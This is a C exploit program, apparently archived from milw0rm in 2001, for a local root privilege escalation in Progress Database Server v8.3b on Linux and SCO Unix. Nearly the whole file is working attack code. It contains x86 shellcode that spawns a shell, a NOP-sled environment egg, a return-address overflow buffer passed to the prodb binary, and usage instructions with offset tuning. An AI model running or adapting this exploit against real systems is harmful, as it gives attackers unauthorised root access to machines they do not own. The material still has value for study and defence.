/* progress database server v8.3b local root compromise.
 * for sco-unix and linux
 *
 * [on linux redhat 6.2 and SCO_SV scosysv 3.2 5.05
 *
 * this is just one of it, advisory about the bug discovery grabbed
 * from packetstorm, which was originally found by: krfinisterre@checkfree.com
 *
 * exploit usage: ./prodbx <distro> [offset]
 *
 * just some quick greets to: wildcoyote, lucipher, tasc, pyra, calimonk
 *          script0r, tozz, c-murdah and cerial
 *
 * - The Itch / BsE
 */
 
#include <stdio.h>
#include <stdlib.h>
 
#define DEFAULT_OFFSET 0
#define DEFAULT_EGG_SIZE 2048
#define DEFAULT_BUFFER_SIZE 4200
#define NOP 0x90
 
unsigned long get_sp(void)
{
  __asm__("movl %esp, %eax");
}
 
/* regular shellcode for linux on the x86 */
char linux_shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
/* shellcode found (and used) in the advisory */
char sco_shellcode[] =
  "\x89\xe6\x83\xc6\x30\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73"
  "\x68\x21\x40\x89\x46\x04\x29\xc0\x88\x46\x07\x89\x76\x0c\xb0\x0b"
  "\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80";

int main(int argc, char *argv[])
{
  char *buff;
  char *egg;
  char *ptr;
  long *addr_ptr;
  long addr;
  int offset = DEFAULT_OFFSET;
  int bsize = DEFAULT_BUFFER_SIZE;
  int eggsize = DEFAULT_EGG_SIZE;
  int unixtype = 0;
  int i;
 
  if(argc < 2) 
  {
    printf("\nProgress Database Server v8.3b local root\n");  
    printf("\nUsage: %s <*nix type> [offset]\n\n", argv[0]);
    printf("1 = linux\n");
    printf("2 = sco-unix\n\n");
    printf("offset is not required, but should be near -50 through 50\n\n");  
    exit(0);
  }

  if(argc > 1) { unixtype = atoi(argv[1]); }
  if(argc > 2) { offset = atoi(argv[2]); }
 
  if(!(buff = malloc(bsize)))  
  {
    printf("Unable to allocate memory for %d bytes\n", bsize);
    exit(0);
  }
 
  if(!(egg = malloc(eggsize)))
  {
    printf("Unable to allocate memory for %d bytes\n", eggsize);
    exit(0);
  }
 
  addr = get_sp() - offset;
 
  printf("\n --== Progress Database Server 8.3b local root ==--\n");
  printf("         Coded by The Itch / BsE\n\n");
  printf("Using return address: 0x%x\n", addr);
  printf("Using offset      : %d\n", offset);
  printf("Using buffersize    : %d\n", bsize);
 
  ptr = buff;
  addr_ptr = (long *) ptr;  
  for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = addr; }
 
  ptr = egg;
  if(unixtype == 1) { for(i = 0; i < eggsize - strlen(linux_shellcode) -1; i++) { *(ptr++) = NOP; } }
  if(unixtype == 2) { for(i = 0; i < eggsize - strlen(sco_shellcode) -1; i++) { *(ptr++) = NOP; } }

  if(unixtype == 1) { for(i = 0; i < strlen(linux_shellcode); i++) { *(ptr++) = linux_shellcode[i]; } }
  if(unixtype == 2) { for(i = 0; i < strlen(sco_shellcode); i++) { *(ptr++) = sco_shellcode[i]; } } 

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';
  memcpy(egg, "EGG=", 4);
  putenv(egg);
  memcpy(buff, "RET=", 4);
  putenv(buff);
 
  /* adjust path of prodb accordingly... */
  system("/usr/dlc/bin/prodb  sports $RET");
 
  return 0;
}      


// milw0rm.com [2001-03-04]
